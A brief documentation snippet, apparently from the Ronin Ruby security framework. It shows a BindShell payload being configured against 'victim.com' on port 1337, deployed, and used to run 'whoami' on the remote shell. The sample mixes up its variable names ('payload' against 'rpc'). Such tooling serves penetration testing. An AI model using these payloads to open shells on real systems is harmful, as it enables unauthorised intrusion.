Overview

A generic payload for interacting with Bind Shells.

require 'ronin/payloads/bind_shell'

payload = Ronin::Payloads::BindShell.new
payload.protocol = :tcp
payload.host = 'victim.com'
payload.port = 1337

rpc.build!
rpc.deploy!

rpc.shell.whoami
# => "www"
